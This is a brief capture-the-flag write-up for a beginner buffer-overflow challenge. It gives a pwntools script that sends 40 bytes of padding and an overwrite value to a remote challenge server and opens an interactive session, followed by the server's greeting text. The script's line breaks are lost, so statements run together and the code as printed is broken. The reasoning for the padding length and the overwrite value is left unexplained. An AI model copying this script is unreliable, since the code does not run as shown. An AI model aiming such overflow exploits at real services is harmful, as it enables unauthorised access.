## Solution

So I know this was a buffer overflow because entering a lot of "A" created a segmentation fault.

```
from pwn import *
flag_address = 0xffffffffffffffffpayload = b"A" * 40
# binary = process("./beginner-generic-pwn-number-0")binary = remote("mc.ax", 31199)print(binary.recvuntil(":(\n"))binary.sendline(payload + p64(flag_address))binary.interactive()# Normal Response# b'"\xf0\x9d\x98\xb1\xf0\x9d\x98\xad\xf0\x9d\x98\xa6\xf0\x9d\x98\xa2\xf0\x9d\x98\xb4\xf0\x9d\x98\xa6 \xf0\x9d\x98\xb8\xf0\x9d\x98\xb3\xf0\x9d\x98\xaa\xf0\x9d\x98\xb5\xf0\x9d\x98\xa6 \xf0\x9d\x98\xa2 \xf0\x9d\x98\xb1\xf0\x9d\x98\xb8\xf0\x9d\x98\xaf \xf0\x9d\x98\xb4\xf0\x9d\x98\xb0\xf0\x9d\x98\xae\xf0\x9d\x98\xa6\xf0\x9d\x98\xb5\xf0\x9d\x98\xaa\xf0\x9d\x98\xae\xf0\x9d\x98\xa6 \xf0\x9d\x98\xb5\xf0\x9d\x98\xa9\xf0\x9d\x98\xaa\xf0\x9d\x98\xb4 \xf0\x9d\x98\xb8\xf0\x9d\x98\xa6\xf0\x9d\x98\xa6\xf0\x9d\x98\xac"\nrob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!\ncan you write me a heartfelt message to cheer me up? :(\n'
